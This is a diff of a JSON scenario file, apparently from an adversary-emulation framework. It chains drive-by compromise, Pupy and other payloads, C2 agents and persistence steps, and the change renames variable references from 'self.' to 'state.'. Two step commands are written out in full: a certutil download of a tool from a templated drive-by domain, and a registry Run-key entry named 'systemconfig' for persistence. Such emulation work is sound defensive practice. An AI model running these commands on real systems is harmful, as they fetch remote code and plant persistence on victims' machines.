@@ -13,7 +13,10 @@
             "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
-                "tool": "self.tool_name"
+                "tool": "state.tool_name"
+            },
+            "set_state": {
+                "actuator": "postconditions.actuator.ret.registered_id"
             }
         },
         {
@@ -21,7 +24,10 @@
             "technique": "Actuator",
             "label": "actuator2",
             "preconditions": {
-                "tool": "self.tool_name2"
+                "tool": "state.tool_name2"
+            },
+            "set_state": {
+                "actuator2": "postconditions.actuator.ret.registered_id"
             }
         },
         {
@@ -29,9 +35,9 @@
             "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -39,9 +45,9 @@
             "technique": "DNS",
             "label": "DNS",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -49,11 +55,11 @@
             "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
-                "self.tool_name": "self.tool",
-                "payload": "self.payload_name2",
-                "exfiltration": "self.exfil",
-                "driveby": "self.driveby",
-                "driveby_ctl": "self.chimera"
+                "state.tool_name": "state.tool",
+                "payload": "state.payload_name2",
+                "exfiltration": "state.exfil",
+                "driveby": "state.driveby",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -61,7 +67,7 @@
             "technique": "Interfaces",
             "label": "Interfaces3",
             "preconditions": {
-                "driveby": "self.driveby3"
+                "driveby": "state.driveby3"
             }
         },
         {
@@ -69,7 +75,7 @@
             "technique": "DNS",
             "label": "DNS3",
             "preconditions": {
-                "driveby": "self.driveby3"
+                "driveby": "state.driveby3"
             }
         },
         {
@@ -78,8 +84,8 @@
             "label": "NGINX3",
             "preconditions": {
                 "payload": "help_win_x86.exe",
-                "driveby": "self.driveby3",
-                "driveby_ctl": "self.chimera"
+                "driveby": "state.driveby3",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -87,7 +93,7 @@
             "technique": "Interfaces",
             "label": "Interfaces4",
             "preconditions": {
-                "driveby": "self.driveby4"
+                "driveby": "state.driveby4"
             }
         },
         {
@@ -95,7 +101,7 @@
             "technique": "DNS",
             "label": "DNS4",
             "preconditions": {
-                "driveby": "self.driveby4"
+                "driveby": "state.driveby4"
             }
         },
         {
@@ -104,8 +110,8 @@
             "label": "NGINX4",
             "preconditions": {
                 "payload": "dismcore.dll",
-                "driveby": "self.driveby4",
-                "driveby_ctl": "self.chimera"
+                "driveby": "state.driveby4",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -113,7 +119,7 @@
             "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
-                "tool": "self.tool"
+                "tool": "state.tool"
             }
         },
         {
@@ -121,8 +127,8 @@
             "technique": "PayloadPupy",
             "label": "Payload2",
             "preconditions": {
-                "tool": "self.tool2",
-                "actuator": "self.actuator2"
+                "tool": "state.tool2",
+                "actuator": "state.actuator2"
             }
         },
         {
@@ -130,10 +136,10 @@
             "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
-                "actuator": "self.actuator",
-                "tool": "self.tool2",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator": "state.actuator",
+                "tool": "state.tool2",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -141,10 +147,10 @@
             "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool2",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool2",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -152,14 +158,17 @@
             "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
-                "actuator_id": "self.actuator2",
-                "phishing": "self.phish_1",
-                "tool": "self.tool2",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator2",
+                "phishing": "state.phish_1",
+                "tool": "state.tool2",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             },
             "tune": {
                 "infra": true
+            },
+            "set_state": {
+                "agent_tgt1": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -167,12 +176,12 @@
             "technique": "IngressToolTransfer",
             "label": "ingressToolTransfer1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain3}/${self.tool_name3}${self.temp_dir_name}\\${self.tool_name3}&& echo \"stderr: \u0001 Command not found\""
+                "command": "cmd /c certutil.exe -urlcache -split -f http://${state.driveby_domain3}/${state.tool_name3}${state.temp_dir_name}\\${state.tool_name3}&& echo \"stderr: \u0001 Command not found\""
             }
         },
         {
@@ -180,12 +189,12 @@
             "technique": "RegistryRunKeysStartupFolder",
             "label": "addRunRegistryKey",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d${self.temp_dir_name}\\${self.tool_name3}&& echo \"stderr: \\1 Command not found\""
+                "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d${state.temp_dir_name}\\${state.tool_name3}&& echo \"stderr: \\1 Command not found\""
             }
         },
         {
@@ -193,9 +202,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             }
         },
         {
@@ -203,9 +212,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         }
     ],
@@ -334,192 +343,28 @@
             }
         }
     },
-    "preconditions": {
-        "state": {},
-        "initial": {
-            "tool_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "name"
-                ]
-            },
-            "tool_name2": {
-                "path": [
-                    "tool",
-                    "2",
-                    "name"
-                ]
-            },
-            "tool_name3": {
-                "path": [
-                    "tool",
-                    "3",
-                    "name"
-                ]
-            },
-            "tool_name4": {
-                "path": [
-                    "tool",
-                    "4",
-                    "name"
-                ]
-            },
-            "payload_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "ioc-binary_payload_name"
-                ]
-            },
-            "payload_name2": {
-                "path": [
-                    "tool",
-                    "2",
-                    "ioc-binary_payload_name"
-                ]
-            },
-            "tool": {
-                "path": [
-                    "tool",
-                    "1"
-                ]
-            },
-            "tool2": {
-                "path": [
-                    "tool",
-                    "2"
-                ]
-            },
-            "exfil": {
-                "path": [
-                    "exfil",
-                    "1"
-                ]
-            },
-            "driveby": {
-                "path": [
-                    "driveby",
-                    "1"
-                ]
-            },
-            "driveby3": {
-                "path": [
-                    "driveby",
-                    "3"
-                ]
-            },
-            "driveby4": {
-                "path": [
-                    "driveby",
-                    "4"
-                ]
-            },
-            "driveby_domain": {
-                "path": [
-                    "driveby",
-                    "1",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "driveby_domain3": {
-                "path": [
-                    "driveby",
-                    "3",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "driveby_domain4": {
-                "path": [
-                    "driveby",
-                    "4",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "chimera": {
-                "path": [
-                    "chimera"
-                ]
-            },
-            "phish_1": {
-                "path": [
-                    "phishing",
-                    "1"
-                ]
-            },
-            "target_1": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "target_1_elevated": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "target_2": {
-                "path": [
-                    "targets",
-                    "2"
-                ]
-            },
-            "temp_dir_name": {
-                "path": [
-                    "targets",
-                    "1",
-                    "ioc-temp_dir"
-                ]
-            },
-            "subnet": {
-                "path": [
-                    "targets",
-                    "1",
-                    "ioc-subnet"
-                ]
-            }
-        },
-        "effects": {
-            "actuator": {
-                "path": [
-                    "actuator",
-                    "actuator",
-                    "ret",
-                    "registered_id"
-                ],
-                "default": 0
-            },
-            "actuator2": {
-                "path": [
-                    "actuator2",
-                    "actuator",
-                    "ret",
-                    "registered_id"
-                ],
-                "default": 0
-            },
-            "scenario_infrastructure": {
-                "path": [
-                    "infrastructure"
-                ]
-            },
-            "agent_tgt1": {
-                "path": [
-                    "webProtocols_1",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            },
-            "agent_tgt1_elevated": {
-                "path": [
-                    "webProtocols_2",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            }
-        }
+    "state": {
+        "tool_name": "spec.tool.1.name",
+        "tool_name2": "spec.tool.2.name",
+        "tool_name3": "spec.tool.3.name",
+        "tool_name4": "spec.tool.4.name",
+        "payload_name": "spec.tool.1.ioc-binary_payload_name",
+        "payload_name2": "spec.tool.2.ioc-binary_payload_name",
+        "tool": "spec.tool.1",
+        "tool2": "spec.tool.2",
+        "exfil": "spec.exfil.1",
+        "driveby": "spec.driveby.1",
+        "driveby3": "spec.driveby.3",
+        "driveby4": "spec.driveby.4",
+        "driveby_domain": "spec.driveby.1.ioc-domain_driveby",
+        "driveby_domain3": "spec.driveby.3.ioc-domain_driveby",
+        "driveby_domain4": "spec.driveby.4.ioc-domain_driveby",
+        "chimera": "spec.chimera",
+        "phish_1": "spec.phishing.1",
+        "target_1": "spec.targets.1",
+        "target_1_elevated": "spec.targets.1",
+        "target_2": "spec.targets.2",
+        "temp_dir_name": "spec.targets.1.ioc-temp_dir",
+        "subnet": "spec.targets.1.ioc-subnet"
     }
 }
